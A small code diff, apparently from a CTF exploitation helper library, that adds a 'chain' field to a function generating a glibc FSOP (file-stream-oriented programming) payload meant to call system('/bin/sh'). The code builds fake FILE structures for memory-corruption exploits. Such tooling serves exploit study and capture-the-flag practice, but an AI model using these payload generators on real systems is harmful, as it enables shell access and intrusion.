@@ -39,7 +39,7 @@ STAT = 0x90
 SHOWMANYC = 0x98
 IMBUE = 0xa0
 
-def fsopsh(func=None, arg=b"/bin/sh\0", file=None, trigger=XSPUTN, lock=None):
+def fsopsh(func=None, arg=b"/bin/sh\0", file=None, trigger=XSPUTN, lock=None, chain=None):
     r"""fsopsh(func=None, arg=b"/bin/sh\0", file=None, trigger=XSPUTN, lock=None) -> bytes
 
     Generate a fsop payload to call a function (usually system("/bin/sh"))
@@ -61,6 +61,7 @@ def fsopsh(func=None, arg=b"/bin/sh\0", file=None, trigger=XSPUTN, lock=None):
 
     return flat({
         0x00: [0x3b01010101010101, arg],
+        0x68: chain if chain else 0x0,
         0x78: -1,
         0x88: lock, # empty zone as lock
         0x90: -1,
